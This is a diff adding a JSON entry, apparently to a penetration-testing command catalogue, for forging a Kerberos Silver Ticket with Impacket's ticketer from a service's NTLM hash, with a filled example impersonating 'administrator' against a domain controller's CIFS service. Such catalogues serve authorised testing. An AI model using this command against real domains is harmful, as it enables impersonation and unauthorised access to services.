@@ -1,0 +1,23 @@
+{
+  "id": "silver-ticket",
+  "name": "Impacket Silver Ticket",
+  "command": "impacket-ticketer -nthash '<hash>' -domain-sid '<domain_sid>' -domain '<domain>' -spn '<service>/<target_host>' '<user>'",
+  "description": "Forge a Silver Ticket (TGS) for a specific service using its NTLM hash",
+  "platform": "linux",
+  "requires": [
+    "hash"
+  ],
+  "protocols": [
+    "kerberos"
+  ],
+  "tags": [
+    "impacket",
+    "silver-ticket",
+    "tgs",
+    "service-ticket",
+    "forgery"
+  ],
+  "examples": [
+    "impacket-ticketer -nthash 'e19ccf75ee54e06b06a5907af13cef42' -domain-sid 'S-1-5-21-1234567890-1234567890-1234567890' -domain 'corp.local' -spn 'cifs/dc01.corp.local' 'administrator'"
+  ]
+}
